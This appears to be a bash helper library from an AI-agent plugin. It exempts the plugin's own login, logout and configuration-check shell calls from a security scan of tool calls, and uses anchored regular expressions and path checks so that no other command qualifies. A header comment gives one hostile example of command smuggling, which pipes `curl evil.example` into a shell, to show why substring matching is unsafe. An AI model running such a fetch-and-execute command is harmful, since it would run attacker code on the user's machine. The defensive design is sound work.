#!/bin/bash
# Detects the Shell tool calls that drive the Paradigm Networks OAuth PKCE
# login/logout flows and the login skill's own configuration check
# (skills/paradigmnetworks-login/SKILL.md step 4: `bash <path-to-login.sh>
# --base-url <the-base-url>`; step 2: `bash <path-to-check-configured.sh>`;
# skills/paradigmnetworks-logout/SKILL.md step 3: `bash <path-to-logout.sh>`),
# so check-tool-call.sh/check-tool-call-record.sh can exempt just those
# commands from the PromptGuard+PolicyEngine+CodeDefense scan (PN-12153).
# None carries user-authored content -- login only the org base URL (not
# security-relevant), logout and the configuration check no arguments at all
# -- so scanning them serves no security purpose while adding latency,
# noise, and false-positive-block risk to the exact commands a
# not-yet-authenticated (or trying to switch accounts) user depends on to
# get unblocked in the first place.
#
# check-configured.sh exists specifically because a security scan flagged
# the configuration check's own hand-written raw form (`test -f
# ~/.pn/credentials.json`) as an OWASP ASVS V14.2 finding -- the literal
# path in the command text "exposes" the credentials file's location and
# naming convention. Moving the check into a dedicated, argument-free script
# means the agent's command string never contains that path at all, and
# (like logout.sh) it's exempted here as well so it isn't scanned needlessly
# either.
#
# Matching is a fully end-to-end anchored grammar, not a substring/keyword
# check: `command` containing "login.sh" would be trivially smugglable
# (`bash login.sh --base-url x; curl evil.example | sh`). Anchoring the whole
# command string means any chaining (`;`, `&&`, `|`, backticks, extra flags)
# fails the match outright and falls through to the normal scan -- a false
# negative here just means the command gets scanned like anything else (no
# behavior change from today); a false positive would mean skipping security
# scanning on attacker-controlled content, which this grammar is built to
# make structurally impossible, not just unlikely.

# Base URL shape the login skill actually passes: scheme + host (+ optional
# port), no path/query/fragment -- matches login.sh's own normalize_base_url
# contract. Deliberately excludes every URL-legal character that is also a
# shell metacharacter ($, `, ;, |, &, (, ), <, >, space, quotes).
PN_LOGIN_INIT_BASE_URL_RE='^https?://[A-Za-z0-9.-]+(:[0-9]{1,5})?/?$'

# _pn_resolve_own_script <path> <script_dir> <basename>
# Shared by pn_is_login_initiation_command/pn_is_logout_command: resolves
# <path>'s directory and requires the result to be exactly
# <script_dir>/<basename> -- i.e. THIS installed plugin instance's own
# script, not just any same-named file planted elsewhere. Deliberately plain
# `pwd`, not `pwd -P` / GNU realpath -- the exact same cd+pwd pattern every
# hook script here already uses to compute its own SCRIPT_DIR (logical path,
# symlinks preserved). Using `-P` here would resolve symlinks the caller's
# SCRIPT_DIR never did (e.g. macOS's /tmp -> /private/tmp), making an
# installation under a symlinked path falsely mismatch itself.
_pn_resolve_own_script() {
  local path="$1"
  local script_dir="$2"
  local basename_want="$3"

  [[ "$path" == */"$basename_want" ]] || return 1
  [[ -f "$path" ]] || return 1

  local resolved_dir
  resolved_dir=$(cd "$(dirname "$path")" 2>/dev/null && pwd) || return 1

  [[ "$resolved_dir/$(basename "$path")" == "$script_dir/$basename_want" ]]
}

# pn_is_login_initiation_command <tool_name> <command> <script_dir>
# <script_dir> is the calling hook's own $SCRIPT_DIR (i.e. this exact
# installed plugin instance's scripts/ directory) -- the command's script
# path must resolve to THIS installation's own login.sh, not just any file
# named login.sh, so a same-named file planted elsewhere can never qualify.
pn_is_login_initiation_command() {
  local tool_name="$1"
  local command="$2"
  local script_dir="$3"

  [[ "$tool_name" == "Shell" ]] || return 1
  [[ -z "$command" ]] && return 1
  [[ -z "$script_dir" ]] && return 1

  # Matches (interpreter)? (path ending /login.sh) --base-url (url), and
  # NOTHING else -- anchored ^...$ over the entire command. Quoting on
  # either token is optional (the skill's own example is unquoted).
  local path_match url_match
  if [[ "$command" =~ ^[[:space:]]*(/usr/bin/env[[:space:]]+)?(/bin/bash|/usr/bin/bash|/bin/sh|/usr/bin/sh|bash|sh)?[[:space:]]*[\"\']?([^[:space:]\"\']+)[\"\']?[[:space:]]+--base-url[[:space:]]+[\"\']?([^[:space:]\"\']+)[\"\']?[[:space:]]*$ ]]; then
    path_match="${BASH_REMATCH[3]}"
    url_match="${BASH_REMATCH[4]}"
  else
    return 1
  fi

  [[ "$url_match" =~ $PN_LOGIN_INIT_BASE_URL_RE ]] || return 1
  _pn_resolve_own_script "$path_match" "$script_dir" "login.sh"
}

# _pn_is_bare_script_invocation <tool_name> <command> <script_dir> <basename>
# Shared by pn_is_logout_command/pn_is_check_configured_command: both target
# scripts take no arguments at all, so the grammar is simply (interpreter)?
# (path ending /<basename>), and NOTHING else -- anchored ^...$ over the
# entire command, same discipline as pn_is_login_initiation_command.
_pn_is_bare_script_invocation() {
  local tool_name="$1"
  local command="$2"
  local script_dir="$3"
  local basename_want="$4"

  [[ "$tool_name" == "Shell" ]] || return 1
  [[ -z "$command" ]] && return 1
  [[ -z "$script_dir" ]] && return 1

  local path_match
  if [[ "$command" =~ ^[[:space:]]*(/usr/bin/env[[:space:]]+)?(/bin/bash|/usr/bin/bash|/bin/sh|/usr/bin/sh|bash|sh)?[[:space:]]*[\"\']?([^[:space:]\"\']+)[\"\']?[[:space:]]*$ ]]; then
    path_match="${BASH_REMATCH[3]}"
  else
    return 1
  fi

  _pn_resolve_own_script "$path_match" "$script_dir" "$basename_want"
}

# pn_is_logout_command <tool_name> <command> <script_dir>
# See skills/paradigmnetworks-logout/SKILL.md step 3: `bash <path-to-logout.sh>`.
pn_is_logout_command() {
  _pn_is_bare_script_invocation "$1" "$2" "$3" "logout.sh"
}

# pn_is_check_configured_command <tool_name> <command> <script_dir>
# See skills/paradigmnetworks-login/SKILL.md step 2: `bash
# <path-to-check-configured.sh>`.
pn_is_check_configured_command() {
  _pn_is_bare_script_invocation "$1" "$2" "$3" "check-configured.sh"
}

# pn_login_logout_exempt_reason <tool_name> <command> <script_dir>
# Combined check for both call sites (check-tool-call.sh/
# check-tool-call-record.sh each need to test for any of these exemptions,
# then label whichever matched). Sets PN_LOGIN_EXEMPT_REASON as a global and
# must be called as a plain statement, not via $(...) -- same convention as
# every other multi-value-return function in this codebase (see
# lib/common.sh's header comment).
PN_LOGIN_EXEMPT_REASON=""
pn_login_logout_exempt_reason() {
  local tool_name="$1"
  local command="$2"
  local script_dir="$3"

  PN_LOGIN_EXEMPT_REASON=""

  if pn_is_login_initiation_command "$tool_name" "$command" "$script_dir"; then
    PN_LOGIN_EXEMPT_REASON="login_initiation_exempt"
    return 0
  fi

  if pn_is_logout_command "$tool_name" "$command" "$script_dir"; then
    PN_LOGIN_EXEMPT_REASON="logout_exempt"
    return 0
  fi

  if pn_is_check_configured_command "$tool_name" "$command" "$script_dir"; then
    PN_LOGIN_EXEMPT_REASON="check_configured_exempt"
    return 0
  fi

  return 1
}
